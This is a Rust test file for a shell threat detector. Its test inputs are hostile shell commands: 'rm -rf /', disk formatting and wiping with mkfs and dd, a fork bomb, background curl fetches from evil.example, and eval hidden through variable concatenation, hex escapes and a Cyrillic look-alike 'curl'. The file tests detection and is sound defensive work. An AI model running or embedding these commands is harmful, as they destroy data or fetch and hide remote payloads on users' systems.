//! Integration tests for destructive and obfuscated shell detection.

use arbitraitor_model::finding::FindingCategory;
use arbitraitor_model::verdict::{Confidence, Severity};
use arbitraitor_shell::{ShellParser, detect_destructive_threats, normalize};

fn findings_for(
    source: &str,
) -> Result<Vec<arbitraitor_model::finding::Finding>, Box<dyn std::error::Error>> {
    let mut parser = ShellParser::new()?;
    let parsed = parser.parse_str(source);
    let normalized = normalize(&parsed.ast, source)?;
    Ok(detect_destructive_threats(&normalized, source))
}

fn first_with_tag<'a>(
    findings: &'a [arbitraitor_model::finding::Finding],
    tag: &str,
) -> Option<&'a arbitraitor_model::finding::Finding> {
    findings
        .iter()
        .find(|finding| finding.tags.iter().any(|value| value == tag))
}

#[test]
fn detects_root_deletion() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("rm -rf /\n")?;
    let finding = first_with_tag(&findings, "destructive-rm").ok_or("missing rm finding")?;
    assert_eq!(finding.category, FindingCategory::DestructiveBehavior);
    assert_eq!(finding.severity, Severity::Critical);
    assert_eq!(finding.confidence, Confidence::Confirmed);
    Ok(())
}

#[test]
fn detects_disk_format_and_wipe() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("mkfs.ext4 /dev/sda1\ndd if=/dev/zero of=/dev/nvme0n1 bs=1M\n")?;
    assert!(first_with_tag(&findings, "destructive-mkfs").is_some());
    assert!(first_with_tag(&findings, "destructive-dd-wipe").is_some());
    Ok(())
}

#[test]
fn detects_fork_bomb() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for(":(){ :|:& };:\n")?;
    let finding = first_with_tag(&findings, "fork-bomb").ok_or("missing fork bomb")?;
    assert_eq!(finding.category, FindingCategory::DestructiveBehavior);
    assert_eq!(finding.severity, Severity::Critical);
    Ok(())
}

#[test]
fn detects_hidden_network_execution() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("nohup curl https://evil.example/payload.sh &\n")?;
    let finding = first_with_tag(&findings, "nohup-network").ok_or("missing nohup finding")?;
    assert_eq!(finding.category, FindingCategory::Persistence);
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_disowned_background_process() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("curl https://evil.example/payload.sh &\ndisown\n")?;
    assert!(first_with_tag(&findings, "background-network").is_some());
    assert!(first_with_tag(&findings, "disown-background").is_some());
    Ok(())
}

#[test]
fn detects_heredoc_generated_script_execution() -> Result<(), Box<dyn std::error::Error>> {
    let source = "cat << 'EOF' > /tmp/script.sh\necho owned\nEOF\nbash /tmp/script.sh\n";
    let findings = findings_for(source)?;
    let finding = first_with_tag(&findings, "heredoc-generated-script")
        .ok_or("missing heredoc generated script finding")?;
    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.confidence, Confidence::High);
    Ok(())
}

#[test]
fn detects_variable_command_concatenation() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("a=ev;b=al;$a$b \"$payload\"\n")?;
    let finding = first_with_tag(&findings, "variable-command-concat")
        .ok_or("missing variable concatenation finding")?;
    assert_eq!(finding.category, FindingCategory::Obfuscation);
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::Medium);
    Ok(())
}

#[test]
fn detects_hex_escape_command_name() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("$(printf '\\x65\\x76\\x61\\x6c') \"$payload\"\n")?;
    assert!(first_with_tag(&findings, "hex-printf-command").is_some());
    Ok(())
}

#[test]
fn detects_unicode_confusable_command_name() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("сurl https://evil.example/payload.sh\n")?;
    let finding = first_with_tag(&findings, "unicode-deception")
        .ok_or("missing unicode deception finding")?;
    assert_eq!(finding.category, FindingCategory::Obfuscation);
    assert_eq!(finding.severity, Severity::Medium);
    assert_eq!(finding.confidence, Confidence::Medium);
    Ok(())
}

#[test]
fn does_not_flag_legitimate_unicode_echo() -> Result<(), Box<dyn std::error::Error>> {
    let findings = findings_for("echo 'Привет мир café'\nprintf '正常なテキスト'\n")?;
    assert!(findings.is_empty());
    Ok(())
}
